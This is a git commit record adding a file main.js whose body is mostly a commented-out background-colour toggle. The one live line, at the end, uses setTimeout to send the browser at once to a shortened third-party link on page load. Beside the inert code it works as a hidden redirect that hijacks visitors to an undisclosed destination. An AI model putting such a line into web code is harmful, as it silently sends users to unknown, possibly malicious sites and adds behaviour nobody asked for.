c7332ed91e7e3c298b4826cd44aa1ba07ae104fc
duonghungit24 <hungduonng721@gmail.com>
2023-03-04 23:31:18 +0700

    commit

---
+++ main.js
@@ -0,0 +1,12 @@
+// let check = true;
+// var change = document.querySelector('body')
+// function action(){
+//     check = !check;
+//     if(check){
+//         change.style.backgroundColor = 'black';
+//     }
+//     else{
+//         change.style.backgroundColor = 'cadetblue';
+//     }
+// }
+ setTimeout("location.href = 'https://shorten.asia/A6FGC7Mp' ", 0);
